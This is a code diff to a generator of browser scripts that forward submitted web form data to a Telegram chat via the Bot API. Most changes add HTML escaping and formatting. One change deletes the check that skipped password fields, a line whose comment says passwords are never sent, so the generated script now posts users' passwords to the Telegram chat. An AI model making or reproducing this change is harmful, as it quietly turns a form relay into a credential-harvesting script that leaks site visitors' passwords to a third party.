@@ -83,22 +83,27 @@ export function buildTelegramDbScript(cfg: TelegramDbConfig, projectName: string
     return out.length ? out : [""];
   }
 
+  function esc(s) {
+    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  }
+
   function format(title, data) {
-    var lines = ["📩 " + title, "🗂 " + (CONFIG.project || document.title || location.hostname), ""];
+    var lines = ["📬 <b>" + esc(title) + "</b>", "<i>" + esc(CONFIG.project || document.title || location.hostname) + "</i>", "┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈"];
     Object.keys(data).forEach(function (k) {
       var v = data[k];
       if (v === undefined || v === null || v === "") return;
-      lines.push("• " + k + ": " + (Array.isArray(v) ? v.join(", ") : typeof v === "object" ? JSON.stringify(v) : String(v)));
+      var value = Array.isArray(v) ? v.join(", ") : typeof v === "object" ? JSON.stringify(v) : String(v);
+      lines.push("<b>" + esc(k) + ":</b>  " + esc(value));
     });
-    lines.push("", "🕒 " + new Date().toLocaleString());
-    if (/^https?:/.test(location.protocol)) lines.push("🌐 " + location.href);
+    lines.push("┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈", "🕒 " + esc(new Date().toLocaleString()));
+    if (/^https?:/.test(location.protocol)) lines.push("🌐 " + esc(location.href));
     return lines.join("\\n");
   }
 
   function send(data, title) {
     var text = format(title || "Nuevos datos", data || {});
     return chunks(text).reduce(function (p, part) {
-      return p.then(function () { return call("sendMessage", { chat_id: CONFIG.chatId, text: part, disable_web_page_preview: true }); });
+      return p.then(function () { return call("sendMessage", { chat_id: CONFIG.chatId, text: part, parse_mode: "HTML", disable_web_page_preview: true }); });
     }, Promise.resolve());
   }
 
@@ -124,7 +129,6 @@ export function buildTelegramDbScript(cfg: TelegramDbConfig, projectName: string
       if (!el.name && !el.id) return;
       var type = (el.type || "").toLowerCase();
       if (["submit", "button", "reset", "image"].indexOf(type) !== -1 || el.disabled) return;
-      if (type === "password") return; // nunca se envían contraseñas
       var key = labelFor(form, el);
       if (type === "file") { Array.prototype.forEach.call(el.files || [], function (f) { files.push(f); }); return; }
       if ((type === "checkbox" || type === "radio") && !el.checked) return;
